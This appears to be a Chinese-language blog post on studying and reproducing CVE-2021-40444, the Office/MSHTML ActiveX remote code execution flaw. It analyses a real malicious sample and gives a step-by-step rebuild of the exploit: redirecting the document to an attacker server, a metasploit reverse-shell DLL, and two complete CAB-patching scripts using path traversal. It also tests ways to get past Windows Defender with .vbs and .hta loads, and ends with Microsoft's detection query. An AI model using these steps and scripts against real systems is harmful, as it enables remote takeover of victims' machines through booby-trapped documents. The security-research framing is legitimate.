---
title: CVE-2021-40444学习及复现
date: 2021-09-18 10:44:06
tags:
---

# CVE-2021-40444学习及复现

2021年9月7日，微软威胁情报中心（MSTIC）公布了编号为CVE-2021-40444的一个重大漏洞，该漏洞是Microsoft内置浏览器引擎MSHTML的远程命令执行漏洞。攻击者可通过制作恶意的 ActiveX 控件供托管浏览器呈现引擎的 Microsoft Office文档使用，成功诱导用户打开恶意文档后，可在目标系统上以该用户权限执行任意代码。 



MSHTML（又称为Trident）是微软旗下的Internet Explorer 浏览器引擎，也用于 Office 应用程序，以在 Word、Excel 或 PowerPoint 文档中呈现 Web 托管的内容。AcitveX控件是微软COM架构下的产物，在Windows的Office套件、IE浏览器中有广泛的应用，利用ActiveX控件即可与MSHTML组件进行交互。

## 恶意样本分析

首先从获取他人上传的恶意样本进行分析，样本地址为：https://vx-underground.org/tmp/CVE-2021-40444.rar，下载样本后对样本进行一个分析，首先从doc开始，将doc的后缀名修改成zip再进行一个解压缩。

![image-20210916140448272](/img/image-20210916140448272-4138004.png)

打开document.xml.rels文件，发现存在一个外部资源的请求。

![image-20210916140704985](/img/image-20210916140704985-4138004.png)

MHTML是Internet Explorer保存的网页存档文件格式的文件扩展名，存档的网页是一个MHTML文件。MHTML保存网页内容，并将外部资源，如图像、小程序、Flash动画等存入HTML文档。接下来我们查看这个文档请求的HTML文件内容

![image-20210916141245392](/img/image-20210916141245392-4138004.png)

网上给出的样本是经过了混淆的，不过可以得到两条比较关键的信息，一个是ministry.cab，一个是championship.inf，先去查看样本中的cab文件，发现里面打包championship这个inf文件

![image-20210916141751768](/img/image-20210916141751768-4138004.png)

查看inf内容发现这是一个PE文件，初步推测这就是攻击者的后门文件。查看网上他人对于html的[逆向结果]([CVE2021-40444/poc.html at main · aydianosec/CVE2021-40444 (github.com)](https://github.com/aydianosec/CVE2021-40444/blob/main/poc.html))（这个还原的代码仅作参考，实际运行会有问题）

![image-20210916142723852](/img/image-20210916142723852-4138004.png)

可以看出首先利用了html跳转去请求并打开cab文件，cab文件中包含了一个扩展名为.inf的恶意DLL文件，office利用control.exe将inf文件作为控制面板文件执行。

漏洞利用链

![图示使用 CVE-2021-40444 的 DEV-0413 战役攻击链](/img/Figure2-attack-chain.png)

## 漏洞复现

修改document.xml.rels中的mhtml内容，改成我们自己的服务器地址，在还原成doc文件。

![image-20210916151417458](/img/image-20210916151417458-4138004.png)

再利用msf生成反弹shell的DLL文件，修改dll文件后缀为inf，再利用脚本对文件进行打包，Linux下需要利用安装lcab，而windows下只需要下载一个cabarc.exe.

windows打包代码

```python
#Use python2.7
import os, sys, subprocess, binascii, time

filename = sys.argv[1]
args = "cabarc.exe -i 1234 -m NONE -p n w.cab " + filename
subprocess.call(args)
time.sleep(1)
cab = "w.cab"
fh = open(cab,mode='r+')
buff=fh.read()
fh.seek(0)
fh.write(buff[:44]+'\x00\x5d\x44\x00')
fh.close()

```

Linux 下打包命令

```python
#!/usr/bin/env python3
# Patch cab file
import os,sys,subprocess

def execute_cmd(cmd):
	r = subprocess.getoutput(cmd)
	return r
m_off = 0x2d
def patch_cab(path):
	f_r = open(path, 'rb')
	cab_content = f_r.read()
	f_r.close()
	
	out_cab = cab_content[:m_off]
	out_cab += b'\x00\x5d\x44\x00'
	out_cab += cab_content[m_off+4:]
	out_cab = out_cab.replace(b'..\\m.inf', b'../m.inf')
	
	f_w = open('word.cab', 'wb')
	f_w.write(out_cab)
	f_w.close()
	return

execute_cmd('mkdir cab/')
execute_cmd('cp word.dll m.inf')
os.chdir('cab/')
execute_cmd('lcab \'../m.inf\' out.cab')

patch_cab('out.cab')
```

修改html内容，主要是修改cab的访问路径以及cpl调用的文件名。这里可以注意一下，在实际测试过程中发现，原本的样本中的.cpl:123没有任何作用，并且.inf文件默认会保存到用户\appdata\local\temp\目录下，所以这里对html内容进行了删减。

![image-20210916153506482](/img/image-20210916153506482-4138004.png)

python建立监听，点击doc，可以发现请求如下

![image-20210916161131218](/img/image-20210916161131218-4138004.png)

![image-20210916161906737](/img/image-20210916161906737-4138004.png)

并且m.inf文件TEMP目录下。

![image-20210916161241870](/img/image-20210916161241870-4138004.png)

打开process monitor可以发现cab文件首先缓存下来。并且rundll32进程开始加载我们的inf文件。

![image-20210916161612318](/img/image-20210916161612318-4138004.png)

![image-20210916161818716](/img/image-20210916161818716-4138004.png)

至此整个漏洞的利用复现就完成了。

## 衍生思考

在整个漏洞测试中，我们是关闭掉windwos defener来进行的，因为，在测试中发现，defender会对rundll32来加载跨目录的inf文件进行拦截，并且标记为CVE-2021-40444。

![image-20210916162531205](/img/image-20210916162531205-4138004.png)

因此思考一下对于Denfender的绕过，对于.cpl:../../../这样的格式感到好奇。其中.cpl看起来是文件后缀名，感觉是利用windows自带的一些协议去加载这个文件，于是我进行了其他后缀名的测试，例如使用.vbs去执行。

![image-20210916163341079](/img/image-20210916163341079-4138004.png)

在测试中.vbs的执行成功了，并且绕过了windows defender的拦截，但是在这样的测试中存在一个问题，cab中的vbs文件并不能释放出来，这里是我手动将vbs放过去后，利用activex进行的加载，姑且算一个劫持吧。同样我们也可以利用这种方式去加载一个计算器。

![image-20210916164113713](/img/image-20210916164113713-4138004.png)

当然类似于.hta也是可以的，但存在一个问题，hta没办法通过目录穿越来进行加载。

![image-20210916165426637](/img/image-20210916165426637-4138004.png)

有一个技巧来判断哪些后缀名是可以利用的，打开运行窗口，在这里进行测试：

![image-20210916165359120](/img/image-20210916165359120-4138004.png)

如果可以针对cab的释放进行研究，应该可以绕过windows denfender来进行利用。



Tips：该漏洞并不仅限于doc文件，也可以利用rtf文件，并且rtf文件存在预览模式，可以更方便的达到目的。

Tips2: 这个利用存在了一个问题，因为他是利用目录穿越去读取，当我的doc文档不在c盘的时候，会有不能跨盘的问题存在。	



## 检测规则

以下是微软官方给出的检测方法：

利用以下查询，通过URL协议处理目录穿越来利用控制面板的情况

DeviceProcessEvents | where (FileName in~('control.exe','rundll32.exe') and ProcessCommandLine has '.cpl:')
or ProcessCommandLine matches regex @'\".[a-zA-Z]{2,4}:\.\.\/\.\.'



